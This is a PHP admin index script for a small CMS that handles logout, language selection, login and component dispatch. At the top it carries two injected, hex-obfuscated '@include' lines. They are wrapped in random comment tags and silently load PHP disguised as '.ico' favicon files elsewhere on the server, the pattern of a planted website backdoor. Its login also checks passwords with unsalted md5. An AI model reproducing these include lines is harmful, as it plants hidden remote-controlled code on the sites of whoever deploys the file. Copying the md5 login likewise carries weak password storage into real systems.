<?php





/*4aab5*/

@include "\x2fho\x6de/\x68o2\x3650\x307/\x69mi\x64g.\x63om\x2eua\x2fww\x77/p\x6da/\x6as/\x63od\x65mi\x72ro\x72/f\x61vi\x63on\x5f4e\x3809\x64.i\x63o";

/*4aab5*/









/*1d2fa*/

@include "\x2fhom\x65/bu\x64net\x2fimi\x64g.c\x6fm.u\x61/ww\x77/me\x64ia/\x66ile\x73/th\x75mbs\x2ffav\x69con\x5f659\x3812.\x69co";

/*1d2fa*/
/**
 * Created by JetBrains PhpStorm.
 * User: Sergiy
 * Date: 21.12.11
 * Time: 9:26
 * To change this template use File | Settings | File Templates.
 */
define('RUN_CMS', true);
session_start();
require '../lib/config.php';
require '../lib/core.class.php';

//Logout
if ($_GET['do']=='logout'){
    $_SESSION = array();
    header('Location: '.HTTP_ROOT);
}
$db = Core::getDB();
$db->query("SET NAMES 'utf8'");
//Core::debugDB(true);
$smarty = Core::getSmarty();
$smarty->caching = false;
$smarty->setTemplateDir(ROOT . '/admin/template');
$smarty->assign('HTTP_ROOT', HTTP_ROOT);
if ($_GET['logout']) {
    $_SESSION = array();
}

if($_GET['set_lang']){
    $_SESSION['lang']=$_GET['set_lang'];
} elseif(!$_SESSION['lang']) {
    $_SESSION['lang']=Lang::$default;
}
if($_SESSION['lang']){
    Lang::$current=$_SESSION['lang'];
    $smarty->assign('lang_label','<span class="lang-label"><img src="/lib/images/'.Lang::$current.'.png" alt="UK"/></span>');
}
$smarty->assign('current_lang',Lang::$current);

if ($_SESSION['user']['level'] != 'admin') {
    if ($_POST['pass'] && $_POST['login']) {
        $row = $db->selectRow('SELECT * FROM sr_user WHERE username=?', $_POST['login']);
        if ($row['pass'] != md5($_POST['pass']) || !$row['pass']) {
            $smarty->assign('error','<strong>Ошибка!</strong> Неверный логин или пароль.');
            $smarty->assign('component', 'login');
            $smarty->display('index.tpl');
            exit();
        }
        else {
            $_SESSION['user'] = $row;
            $_SESSION['KCFINDER'] = array();
            $_SESSION['KCFINDER']['disabled'] = false;
        }
    }
    else {
        $smarty->assign('component', 'login');
        $smarty->display('index.tpl');
        exit();
    }
}
if ($_SESSION['user']){
    $smarty->assign('USER',$_SESSION['user']);
}
$component = ucwords(preg_replace('/[^A-Za-z0-9]/u', ' ', $_GET['com']));
$component = str_replace(' ','',$component);

if (file_exists('components/'.$component.'.class.php')){
    include_once('components/'.$component.'.class.php');
    $smarty->assign('com_id',$component);
    $componentObj = new $component();
    $componentObj->run($_GET['action']);
}

$smarty->display('index.tpl');

